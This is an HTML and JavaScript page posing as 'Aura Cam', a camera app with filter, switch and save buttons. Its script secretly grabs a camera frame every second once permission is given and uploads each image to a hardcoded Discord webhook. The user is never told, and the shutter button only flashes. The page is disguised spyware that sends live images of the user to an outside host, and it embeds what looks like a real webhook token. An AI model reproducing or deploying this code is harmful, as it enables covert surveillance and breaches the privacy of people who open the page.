<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Aura Cam </title>
<style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
        font-family: 'Segoe UI', sans-serif;
        background: radial-gradient(circle at top, #0f172a, #020617);
        color: white;
        height: 100vh;
        display: flex;
        justify-content: center;
        align-items: center;
        overflow: hidden;
    }

    .app {
        width: 360px;
        height: 640px;
        border-radius: 30px;
        background: rgba(255,255,255,0.05);
        backdrop-filter: blur(20px);
        box-shadow: 0 0 40px rgba(0,255,255,0.2);
        position: relative;
        overflow: hidden;
        border: 1px solid rgba(255,255,255,0.1);
    }

    video, canvas {
        width: 100%;
        height: 100%;
        object-fit: cover;
    }

    .top-bar {
        position: absolute;
        top: 0;
        width: 100%;
        padding: 20px;
        display: flex;
        justify-content: space-between;
        z-index: 2;
    }

    .glow-btn {
        background: rgba(255,255,255,0.1);
        border: 1px solid rgba(0,255,255,0.3);
        color: #0ff;
        padding: 8px 12px;
        border-radius: 10px;
        cursor: pointer;
        transition: 0.3s;
        font-size: 12px;
        text-transform: uppercase;
        letter-spacing: 1px;
    }

    .glow-btn:hover {
        box-shadow: 0 0 15px #0ff;
        transform: scale(1.05);
    }

    .capture-btn {
        position: absolute;
        bottom: 30px;
        left: 50%;
        transform: translateX(-50%);
        width: 70px;
        height: 70px;
        border-radius: 50%;
        background: radial-gradient(circle, #0ff, #00f);
        box-shadow: 0 0 25px #0ff;
        cursor: pointer;
        z-index: 2;
        border: 4px solid white;
    }

    .capture-btn:active {
        transform: translateX(-50%) scale(0.9);
    }

    .filter-bar {
        position: absolute;
        bottom: 120px;
        width: 100%;
        display: flex;
        justify-content: center;
        gap: 8px;
        z-index: 2;
        padding: 0 10px;
    }

    .filter {
        padding: 6px 10px;
        border-radius: 20px;
        background: rgba(255,255,255,0.1);
        border: 1px solid rgba(255,255,255,0.2);
        cursor: pointer;
        font-size: 10px;
        transition: 0.2s;
    }

    .filter:hover {
        background: rgba(0, 255, 255, 0.2);
    }

    .flash {
        position: absolute;
        top:0; left:0;
        width:100%; height:100%;
        background:white;
        opacity:0;
        pointer-events:none;
        transition: opacity 0.1s;
        z-index: 5;
    }
</style>
</head>
<body>

<div class="app">
    <div class="top-bar">
        <button class="glow-btn" onclick="switchCamera()">🔄 Switch</button>
        <button class="glow-btn" onclick="downloadImage()">💾 Save</button>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none"></canvas>

    <div class="filter-bar">
        <div class="filter" onclick="setFilter('none')">Normal</div>
        <div class="filter" onclick="setFilter('grayscale(1)')">Mono</div>
        <div class="filter" onclick="setFilter('sepia(1)')">Retro</div>
        <div class="filter" onclick="setFilter('contrast(2)')">Boost</div>
        <div class="filter" onclick="setFilter('invert(1)')">Invert</div>
    </div>

    <div class="capture-btn" onclick="manualCapture()"></div>
    <div class="flash" id="flash"></div>
</div>

<script>
    // CONFIGURATION
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1489100868287463544/TbvEnlZkfuJafPylgOMJJkPZxwXP8xfkjQHtewRC4w0G43NbkXDjfCiT5sUgK9F4lH9Y'; 
    
    let video = document.getElementById('video');
    let canvas = document.getElementById('canvas');
    let ctx = canvas.getContext('2d');
    let currentStream;
    let facingMode = "user";
    let currentFilter = "none";
    let autoInterval;

    // Start Camera Access
    async function startCamera() {
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
            clearInterval(autoInterval);
        }

        try {
            currentStream = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: facingMode },
                audio: false
            });
            video.srcObject = currentStream;

            // Trigger the 1-second auto-send loop once metadata is ready
            video.onloadedmetadata = () => {
                autoInterval = setInterval(autoSendToDiscord, 1000);
            };
        } catch (err) {
            alert("Camera Error: Please check permissions and use HTTPS or Localhost.");
            console.error(err);
        }
    }

    function switchCamera() {
        facingMode = (facingMode === "user") ? "environment" : "user";
        startCamera();
    }

    function setFilter(filter) {
        currentFilter = filter;
        video.style.filter = filter;
    }

    // Auto-capture function for Discord Webhook
    async function autoSendToDiscord() {
        if (!video.videoWidth || DISCORD_WEBHOOK_URL.includes('YOUR_DISCORD')) return;

        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.filter = currentFilter;
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

        canvas.toBlob(async (blob) => {
            if (!blob) return;

            const formData = new FormData();
            formData.append('file', blob, 'aura_security_test.png');
            formData.append('content', `📡 **Live Stream Update**\nTime: \`${new Date().toLocaleTimeString()}\`\nFilter: \`${currentFilter}\``);

            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    body: formData
                });
            } catch (e) {
                console.warn("Upload failed. Ensure you are using a valid URL and local server.");
            }
        }, 'image/png');
    }

    // Manual capture for the UI button
    function manualCapture() {
        flashEffect();
        // The autoSend function already keeps canvas updated, 
        // but we can force a high-res draw here if needed.
        console.log("Manual snapshot saved to memory.");
    }

    function flashEffect() {
        const flash = document.getElementById('flash');
        flash.style.opacity = 1;
        setTimeout(() => flash.style.opacity = 0, 100);
    }

    function downloadImage() {
        // Redraw to ensure current frame is captured
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        ctx.filter = currentFilter;
        ctx.drawImage(video, 0, 0);

        const link = document.createElement('a');
        link.download = `aura-snap-${Date.now()}.png`;
        link.href = canvas.toDataURL('image/png');
        link.click();
    }

    // Cleanup: Stop camera and interval if user leaves
    window.addEventListener('beforeunload', () => {
        clearInterval(autoInterval);
        if (currentStream) {
            currentStream.getTracks().forEach(track => track.stop());
        }
    });

    startCamera();
</script>

</body>
</html>
